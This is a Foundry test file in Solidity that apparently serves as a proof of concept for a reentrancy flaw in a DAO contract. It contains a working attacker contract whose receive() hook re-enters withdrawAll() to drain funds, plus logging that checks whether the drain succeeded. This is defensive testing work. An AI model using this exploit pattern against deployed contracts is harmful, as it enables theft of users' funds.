// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/reentrancy_dao.sol";

contract MaliciousContract {
    ReentrancyDAO public dao;
    uint public attackCount;

    constructor(address _dao) {
        dao = ReentrancyDAO(_dao);
    }

    // Fallback function that will be triggered when receiving ETH
    receive() external payable {
        if (attackCount < 1) {
            attackCount++;
            dao.withdrawAll();
        }
    }

    function attack() external payable {
        // Deposit some ETH first to have credit
        dao.deposit{value: msg.value}();
        // Start the attack by withdrawing
        dao.withdrawAll();
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}

contract ReentrancyDAOTest is Test {
    ReentrancyDAO public dao;
    MaliciousContract public attacker;
    address public user = address(0x1);
    uint public initialDeposit = 1 ether;

    function setUp() public {
        dao = new ReentrancyDAO();
        attacker = new MaliciousContract(address(dao));
        
        // Fund the user and attacker
        vm.deal(user, initialDeposit);
        vm.deal(address(attacker), initialDeposit);
    }

    function testReentrancyAttack() public {
        // Normal user deposits funds
        vm.prank(user);
        dao.deposit{value: initialDeposit}();

        // Check initial contract balance
        uint initialContractBalance = address(dao).balance;
        assertEq(initialContractBalance, initialDeposit);

    // ---- Start Differential Checks ----
    console.log("--- BEFORE-Trigger State ---");
    uint daoBalanceBefore = address(dao).balance;
    uint attackerCreditBefore = dao.getUserCredit(address(attacker));
    uint userCreditBefore = dao.getUserCredit(user);
    uint totalWithdrawalsBefore = dao.totalWithdrawals();
    console2.log("Contract ETH Balance:", daoBalanceBefore);
    console2.log("Attacker Credit:", attackerCreditBefore);
    console2.log("User Credit:", userCreditBefore);
    console2.log("Total Withdrawals:", totalWithdrawalsBefore);

    console.log("--- Trigger Reentrancy Attack ---");
    // Attacker deposits and attacks
    attacker.attack{value: initialDeposit}();

    console.log("--- AFTER-Trigger State ---");
    uint daoBalanceAfter = address(dao).balance;
    uint attackerCreditAfter = dao.getUserCredit(address(attacker));
    uint userCreditAfter = dao.getUserCredit(user);
    uint totalWithdrawalsAfter = dao.totalWithdrawals();
    console2.log("Contract ETH Balance:", daoBalanceAfter);
    console2.log("Attacker Credit:", attackerCreditAfter);
    console2.log("User Credit:", userCreditAfter);
    console2.log("Total Withdrawals:", totalWithdrawalsAfter);

    // Validate vulnerability existence
    bool contractDrained = (daoBalanceAfter == 0);
    bool attackerCreditReset = (attackerCreditAfter == 0);
    bool userCreditUnchanged = (userCreditAfter == userCreditBefore);
    bool withdrawalsExploded = (totalWithdrawalsAfter > dao.totalDeposits());
    
    // Log state comparisons
    console.log("\n--- Differential Validation Results ---");
    console.log("1. Contract Drained: %s (Before=%s, After=%s)", contractDrained, daoBalanceBefore, daoBalanceAfter);
    console.log("2. Attacker Credit Reset: %s (Before=%s, After=%s)", attackerCreditReset, attackerCreditBefore, attackerCreditAfter);
    console.log("3. User Credit Unchanged: %s (Before=%s, After=%s)", userCreditUnchanged, userCreditBefore, userCreditAfter);
    console.log("4. Withdrawals Exceed Deposits: %s (TotalDeposits=%s, TotalWithdrawals=%s)",
        withdrawalsExploded, dao.totalDeposits(), totalWithdrawalsAfter);
    
    // Final vulnerability verdict
    if (contractDrained && userCreditUnchanged && withdrawalsExploded) {
        console.log("Vulnerability Exists: Contract ETH drained, user credits intact, withdrawals exceed deposits");
    } else {
        console.log("Vulnerability not Exist: State changes not match reentrancy patterns");
    }
    // ---- End Differential Checks ----
    }
}